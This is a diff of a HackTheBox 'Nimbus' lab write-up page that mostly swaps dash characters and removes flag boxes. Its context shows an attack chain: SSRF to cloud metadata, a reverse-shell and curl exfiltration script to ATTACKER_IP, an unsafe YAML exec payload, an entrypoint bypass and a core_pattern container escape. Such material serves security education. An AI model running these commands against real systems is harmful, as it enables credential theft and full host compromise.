@@ -4,7 +4,7 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta name="theme-color" content="#030305"/>
-<title>Nimbus — HTB Write Up | pumkin</title>
+<title>Nimbus - HTB Write Up | pumkin</title>
 <meta name="description" content="HackTheBox Nimbus (Hard, Linux) full write up: SSRF → IMDS → SQS injection → worker RCE → privileged CodeBuild → container escape to root."/>
 <link rel="icon" href="../cat.png"/>
 <style>
@@ -92,7 +92,7 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
         <li>Kernel usermode-helper escapes via writable <code>core_pattern</code></li>
       </ul>
 
-      <pre>Nimbus — Root Path
+      <pre>Nimbus - Root Path
 │
 ├── 1. SSRF (job preview endpoint)
 │     └── decimal-IP bypass → 169.254.169.254
@@ -139,24 +139,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
       <pre># /etc/hosts
 10.129.32.106  nimbus.htb
 
-# directories — http://nimbus.htb
+# directories - http://nimbus.htb
 login      [Status: 200, Size: 876]
 jobs       [Status: 200, Size: 3453]
 
-# vhosts (light) — nimbus.htb
+# vhosts (light) - nimbus.htb
 aws        [Status: 403, Size: 305]</pre>
-      <p>SMB, LDAP and WinRM are all absent — this is a pure web + AWS chain. Two things stand out: the <code>/jobs</code> endpoint and the <code>aws</code> vhost, which will turn out to be the AWS emulator proxy.</p>
+      <p>SMB, LDAP and WinRM are all absent - this is a pure web + AWS chain. Two things stand out: the <code>/jobs</code> endpoint and the <code>aws</code> vhost, which will turn out to be the AWS emulator proxy.</p>
 
-      <h2>Foothold — SSRF to IMDS</h2>
-      <p>The <code>jobs</code> page submits to <code>POST /jobs/preview</code> with form data <code>url:</code>. The endpoint fetches the supplied URL and <strong>reflects the raw body back</strong> — a full-read SSRF.</p>
+      <h2>Foothold - SSRF to IMDS</h2>
+      <p>The <code>jobs</code> page submits to <code>POST /jobs/preview</code> with form data <code>url:</code>. The endpoint fetches the supplied URL and <strong>reflects the raw body back</strong> - a full-read SSRF.</p>
       <pre>curl -s --resolve nimbus.htb:80:TARGET_IP -X POST http://nimbus.htb/jobs/preview \
   --data-urlencode 'url=http://ATTACKER_IP:8000/test.yaml'
 # -&gt; "Fetched: ... HTTP 200" + raw body echoed back  == full-read SSRF</pre>
 
       <p>Two filters are in place, both trivially bypassed:</p>
       <ul>
-        <li><strong>Suffix check</strong> — the URL must end in <code>.yaml</code>/<code>.yml</code>. Append <code>?x=.yaml</code>.</li>
-        <li><strong>Internal-resource blocklist</strong> — <code>aws.nimbus.htb</code>, <code>169.254.169.254</code>, <code>127.0.0.1</code>, <code>localhost</code>, the box IP, hex IPs and <code>.nip.io</code> are all blocked.</li>
+        <li><strong>Suffix check</strong> - the URL must end in <code>.yaml</code>/<code>.yml</code>. Append <code>?x=.yaml</code>.</li>
+        <li><strong>Internal-resource blocklist</strong> - <code>aws.nimbus.htb</code>, <code>169.254.169.254</code>, <code>127.0.0.1</code>, <code>localhost</code>, the box IP, hex IPs and <code>.nip.io</code> are all blocked.</li>
       </ul>
       <p>The fetcher does <strong>not</strong> follow redirects, so an open redirect is useless. The working bypass is <strong>decimal (or octal) IP encoding</strong>: it passes the string blocklist while <code>requests</code> still resolves it.</p>
       <pre>169.254.169.254  →  2852039166          (decimal)
@@ -188,10 +188,10 @@ aws $E sqs list-queues
 #  http://floci:4566/847219365028/nimbus-jobs   &lt;-- "floci":4566 emulator</pre>
       <p>An SQS queue named <code>nimbus-jobs</code> is present. Given the app's YAML preview feature and the queue name, a worker process almost certainly consumes messages and deserializes them as YAML.</p>
 
-      <h2>User — SQS Injection to Worker RCE</h2>
+      <h2>User - SQS Injection to Worker RCE</h2>
       <p>Python's <code>yaml.load()</code> without a safe loader will instantiate arbitrary Python objects. The worker is expected to execute the contents of a <code>script</code> field via <code>python3 -c</code>. We build a YAML body that base64-encodes our code to dodge quoting hell.</p>
 
-      <h3>Step 1 — reverse shell / exfil script</h3>
+      <h3>Step 1 - reverse shell / exfil script</h3>
       <pre>import os,socket,subprocess
 
 if os.fork() != 0:
@@ -207,18 +207,18 @@ while True:
       <pre>import os
 os.system("id | curl -s -X POST http://ATTACKER_IP:8001 -d @-")</pre>
 
-      <h3>Step 2 — base64-encode it</h3>
+      <h3>Step 2 - base64-encode it</h3>
       <pre>base64 rce.py
-# copy the output string — that's your B64 value</pre>
+# copy the output string - that's your B64 value</pre>
 
-      <h3>Step 3 — build the YAML message body</h3>
+      <h3>Step 3 - build the YAML message body</h3>
       <pre>name: pwn
 schedule: manual
 runtime: python3.11
 script: |
   import base64;exec(base64.b64decode('&lt;B64&gt;').decode())</pre>
 
-      <h3>Step 4 — send the message</h3>
+      <h3>Step 4 - send the message</h3>
       <pre>aws --endpoint-url http://aws.nimbus.htb sqs send-message \
   --queue-url http://floci:4566/847219365028/nimbus-jobs \
   --message-body $'name: pwn\nschedule: manual\nruntime: python3.11\nscript: |\n  import base64;exec(base64.b64decode(\'&lt;B64&gt;\').decode())'
@@ -228,22 +228,21 @@ script: |
     "MessageId": "c2d78d09-7b38-4ad4-add6-e7587bcb4d88"
 }</pre>
 
-      <h3>Step 5 — catch the callback</h3>
+      <h3>Step 5 - catch the callback</h3>
       <pre># start BEFORE sending the message
 python3 -m http.server 8001
 # or for a proper reverse shell:
 nc -lvnp 4444</pre>
 
       <p>The worker picks up the message, the unsafe YAML load fires, and we land a shell as <code>worker</code>. The user flag is at <code>/home/worker/user.txt</code>.</p>
-      <div class="info-cell" style="margin:1rem 0"><div class="lbl">user.txt</div><div class="val" style="font-family:'JetBrains Mono','Fira Code',monospace;color:#c084fc;font-size:.85rem">HTB{...user flag...}</div></div>
 
       <h2>Privilege Escalation</h2>
       <h3>Internal LocalStack discovery</h3>
       <p>From the worker we reach the emulator's real endpoint, <code>floci:4566</code>. The emulator runs with <code>ENFORCE_IAM=false</code>, so any credentials (even garbage) are accepted and every service is fair game. Probing the AWS services available:</p>
       <ul>
-        <li><strong>ECS</strong> — registering a task definition with <code>"privileged": true</code> runs, but <code>privileged</code> is silently ignored. Dead end.</li>
-        <li><strong>Lambda</strong> — function runs, but the container cannot write <code>/proc/sys/kernel/core_pattern</code>. Not privileged. Dead end.</li>
-        <li><strong>CodeBuild</strong> — accepts <code>"privilegedMode": true</code>. This is the one.</li>
+        <li><strong>ECS</strong> - registering a task definition with <code>"privileged": true</code> runs, but <code>privileged</code> is silently ignored. Dead end.</li>
+        <li><strong>Lambda</strong> - function runs, but the container cannot write <code>/proc/sys/kernel/core_pattern</code>. Not privileged. Dead end.</li>
+        <li><strong>CodeBuild</strong> - accepts <code>"privilegedMode": true</code>. This is the one.</li>
       </ul>
 
       <h3>Privileged CodeBuild project</h3>
@@ -257,7 +256,7 @@ aws --endpoint-url http://floci:4566 codebuild start-build --project-name test-p
   --buildspec-override '{"version":"0.2", "phases":{"build":{"commands":["id","cat /proc/self/status | grep CapEff"]}}}'
 
 # CapEff: 0000000000000000</pre>
-      <p>The build ran but <code>CapEff: 0000000000000000</code> — zero capabilities. The <code>floci/floci:latest</code> image entrypoint does a <code>gosu</code> drop to uid 1001, so even with <code>privilegedMode=true</code> the container dropped privileges before our commands ran.</p>
+      <p>The build ran but <code>CapEff: 0000000000000000</code> - zero capabilities. The <code>floci/floci:latest</code> image entrypoint does a <code>gosu</code> drop to uid 1001, so even with <code>privilegedMode=true</code> the container dropped privileges before our commands ran.</p>
 
       <h3>Entrypoint UID-drop bypass</h3>
       <p>The entrypoint trusts the output of <code>id</code> to decide whether to drop privileges. Bash environment variables can override exported functions: if we ship <code>BASH_FUNC_id%%</code> as a build environment override, the <code>id</code> "command" resolves to our fake function reporting <code>uid=0(root)</code>. The entrypoint believes it is already root and skips the drop.</p>
@@ -266,7 +265,7 @@ BASH_FUNC_id%%  =  () { echo uid=1000; }</pre>
       <p>With the override injected via <code>environmentVariablesOverride</code>, the container keeps its privileged caps (<code>CAP_SYS_ADMIN</code>, etc.) and our build commands run as UID 0.</p>
 
       <h3>Kernel usermode-helper escape</h3>
-      <p>Inside the privileged container we can write <code>/proc/sys/kernel/core_pattern</code>. Core dumps are handled by the host kernel's usermode-helper, so a malicious pattern runs a script <strong>as host root</strong>. Because the container's root filesystem is an overlay, the script is placed in the overlay <code>upperdir</code> — a path that is real on the host side.</p>
+      <p>Inside the privileged container we can write <code>/proc/sys/kernel/core_pattern</code>. Core dumps are handled by the host kernel's usermode-helper, so a malicious pattern runs a script <strong>as host root</strong>. Because the container's root filesystem is an overlay, the script is placed in the overlay <code>upperdir</code> - a path that is real on the host side.</p>
       <pre># 1. find the host-side overlay upperdir
 UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
 
@@ -284,12 +283,11 @@ bash -c 'kill -11 $$'
 # 5. read the flag
 curl -s -X POST http://ATTACKER_IP:9222/root -d "flag=$(cat /rootflag.txt | base64 -w0)"</pre>
       <p>The <code>core_pattern</code> pipeline is executed by the host kernel's usermode-helper as root. Our script lands <code>root.txt</code> into the overlay upperdir, which the container can read back.</p>
-      <div class="info-cell" style="margin:1rem 0"><div class="lbl">root.txt</div><div class="val" style="font-family:'JetBrains Mono','Fira Code',monospace;color:#c084fc;font-size:.85rem">HTB{...root flag...}</div></div>
 
       <h2>Full-chain PoC script</h2>
-      <p>The entire chain — IMDS credential theft, SQS payload, CodeBuild project creation, entrypoint bypass and kernel escape — was automated in a single Python script:</p>
+      <p>The entire chain - IMDS credential theft, SQS payload, CodeBuild project creation, entrypoint bypass and kernel escape - was automated in a single Python script:</p>
       <pre>#!/usr/bin/env python3
-# HTB Nimbus — full chain PoC
+# HTB Nimbus - full chain PoC
 # SSRF→IMDS creds → SQS yaml.load RCE → worker shell
 # → CodeBuild privileged container (BASH_FUNC_id%% bypass)
 # → core_pattern usermode-helper escape → host root
@@ -357,11 +355,11 @@ def send_sqs_job(creds, python_code):
 
       <h2>Key Takeaways</h2>
       <ul>
-        <li><strong>IP-encoding bypasses</strong> beat string blocklists every time — decimal and octal forms are worth testing when <code>169.254.169.254</code> is filtered.</li>
+        <li><strong>IP-encoding bypasses</strong> beat string blocklists every time - decimal and octal forms are worth testing when <code>169.254.169.254</code> is filtered.</li>
         <li><strong>Always use a safe loader</strong> (<code>yaml.safe_load</code>) for untrusted input; <code>yaml.load()</code> is arbitrary code execution by design.</li>
-        <li><strong>Emulators inherit the trust of the real service</strong> — an exposed LocalStack with IAM disabled lets anyone manage compute, storage and queues.</li>
+        <li><strong>Emulators inherit the trust of the real service</strong> - an exposed LocalStack with IAM disabled lets anyone manage compute, storage and queues.</li>
         <li><strong>Container entrypoints that trust <code>id</code> are attackable</strong> through Bash's <code>BASH_FUNC_*</code> environment export mechanism.</li>
-        <li><strong>A privileged container + writable <code>core_pattern</code> is full host compromise</strong> — the usermode-helper runs as host root.</li>
+        <li><strong>A privileged container + writable <code>core_pattern</code> is full host compromise</strong> - the usermode-helper runs as host root.</li>
       </ul>
 
     </div>
